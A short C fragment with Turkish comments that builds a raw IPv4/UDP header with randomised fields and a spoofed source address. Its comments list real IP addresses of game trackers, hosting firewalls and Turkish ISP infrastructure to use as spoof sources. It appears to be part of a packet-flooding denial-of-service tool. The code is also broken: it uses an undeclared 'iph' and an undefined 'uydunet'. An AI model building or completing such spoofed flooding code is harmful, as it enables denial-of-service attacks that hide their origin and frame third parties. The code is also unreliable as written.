

void mrhasan1337(struct iphdr *gonder)
{
  gonder->ihl = 5; // IHL Ayar Bolumu
  gonder->version = 4; // IP Version Bolumu IPv4 & IPv6
  iph->tos = rand(); // TOS Bolumu (Type Of Service)
  gonder->tot_len = sizeof(struct iphdr) + 30; // Total Lenght Bolumu IP Lenght
  gonder->id = htonl(rand()%65535); // Windows Paket ID Bolumu.
  gonder->frag_off = 0; // Fragmentation Ayar Bolumu.
  gonder->ttl = rand(); // TTL Bolumu.
  gonder->protocol = 17; // IP Protocol Bolumu.
  gonder->check = 0; // Checksum Bolumu.
 
// 208.167.241.190 -->> 3500667326 (GameTracker)
// 208.167.241.185 -->> 3500667321 (GameTracker)
// 129.250.3.98 -->> 2180645730 (Digital Ocean VIP FW Santral IP)
// 128.65.210.118 -->> 2151797366 (TeamSpeak3 Local IP)
// 80.239.195.97 -->> 1357890401 (OVH Game FW Santral IP)
// 5.254.73.70 -->> 100550982 (Voxilty Firewall IP)
// 193.192.122.5 -->> 3250616837 (Turknet Santral IP)
// 94.55.115.11 -->> 2968540420 (Uydunet Santral IP)
// 86.108.193.7  -->> 1449967621 (Turkcell Superonline Santral IP)


// Source IP List Bolumu Sinir Yoktur Fakat IPLer Dechimal Ile Yazilmak Zorundadir.
 
 
  // Source IP Bolumu Bu Bolumun Calismasi Icın saddr Yani Spoof Ozellik Kapali Olmalidir.
  gonder->saddr = htonl(uydunet); // Degiskenlerin Hangisini Kullanacagini Belirleme Bolumu.
}
